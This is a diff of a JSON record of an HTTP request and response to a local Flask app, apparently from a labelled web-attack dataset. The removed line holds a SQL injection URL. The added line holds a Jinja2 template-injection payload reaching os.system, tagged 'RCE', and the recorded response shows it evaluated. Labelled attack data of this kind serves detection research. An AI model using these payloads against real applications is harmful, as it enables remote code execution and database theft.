@@ -2,20 +2,30 @@
         "request": {
             "headers": {
                 "Host": "127.0.0.1:5000",
-                "User-Agent": "Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
+                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
                 "Accept-Encoding": "gzip, deflate, br",
                 "Accept": "*/*",
                 "Connection": "keep-alive",
-                "Accept-Language": "de-CH",
+                "Accept-Language": "de",
                 "Sec-Fetch-Site": "none",
                 "Sec-Fetch-Mode": "same-origin",
                 "Sec-Fetch-User": "?1",
                 "Sec-Fetch-Dest": "document",
-                "Set-Cookie": "['ck=muPiRwfs50vPD8a_Dut1Y7xUUCO6j9vuFM716ngcX2z7WN3BIhHkujqn41jzWMNUqHBtKPatKccRvwO2EMT1-Q; Domain=localhost:5000; Expires=Wed, 21 Dec 2022 18:40:01 GMT', 'uu=wrX0RUNF1IDaGJthGc-K3JV0G7hlUBbJklMYtTbdmHWBGzLdebGdGQb3xatSrk6UTdf8l7V6DLNx9f8KOaEmJw; Domain=localhost:5000; Expires=Tue, 06 Dec 2022 18:40:01 GMT', 'session=825a0b1a-a2ac-4bb5-84ff-c2650a1bf80b; Expires=Mon, 21 Nov 2022 19:10:01 GMT']",
-                "Date": "Mon, 21 Nov 2022 18:40:01 GMT"
+                "Set-Cookie": "['ck=Ra2Zey89Ohi79Bq_OakI_bILKXbBRe3S-0qcBYj9AFrsiIHkjCjEnOQnB8086CXr4znqDesa2tqSpZB7eXVtyQ; Domain=localhost:5000; Expires=Wed, 21 Dec 2022 18:12:17 GMT', 'uu=sQWDuekvCGolsDYqOfJ6vvRfX7eJcMH3c7RwRMvgit3jW6ufAMZSXJzlB8CEf79rld5HTn0nAc5o3I9ZGm0G-Q; Domain=localhost:5000; Expires=Tue, 06 Dec 2022 18:12:17 GMT', 'session=e2fb7984-14fa-4391-bf0c-e57653365d41; Expires=Mon, 21 Nov 2022 18:42:17 GMT']",
+                "Date": "Mon, 21 Nov 2022 18:12:17 GMT"
             },
             "method": "GET",
-            "url": "http://127.0.0.1:5000/orders/get/country?country=';SELECT%20*%20FROM%20us_states%20limit59--",
-            "body": ""
+            "url": "http://127.0.0.1:5000/greet/%7B%7Bget_flashed_messages.__globals__.__builtins__.__import__('os').system%7D%7D",
+            "body": "",
+            "Attack_Tag": "RCE"
+        },
+        "response": {
+            "status": "200 OK",
+            "headers": {
+                "Content-Type": "text/html; charset=utf-8",
+                "Content-Length": "48"
+            },
+            "status_code": 200,
+            "body": "<h2>Hello &lt;built-in function system&gt;!</h2>"
         }
     }
